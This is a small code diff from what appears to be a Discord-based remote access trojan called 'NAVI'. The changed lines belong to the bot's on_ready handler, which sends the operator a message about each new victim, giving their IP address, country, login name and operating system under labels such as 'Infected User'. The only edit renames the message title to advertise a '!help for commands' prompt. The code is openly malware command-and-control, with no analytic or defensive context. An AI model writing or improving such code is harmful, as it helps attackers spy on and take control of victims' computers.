@@ -121,7 +121,7 @@ async def on_ready():
     ip = data.get("ip", "Unknown")
     flag = data.get("country", "US")
     
-    embed = discord.Embed(title="NAVI • SESSION ESTABLISHED", color=0x00ff00)
+    embed = discord.Embed(title="NAVI • !help for commands", color=0x00ff00)
     embed.add_field(name="Session ID", value=f"`{channel_name}`", inline=True)
     embed.add_field(name="Infected User", value=f"`{os.getlogin()}`", inline=True)
     embed.add_field(name="Operating System", value=f"`{platform.system()} {platform.release()}`", inline=False)
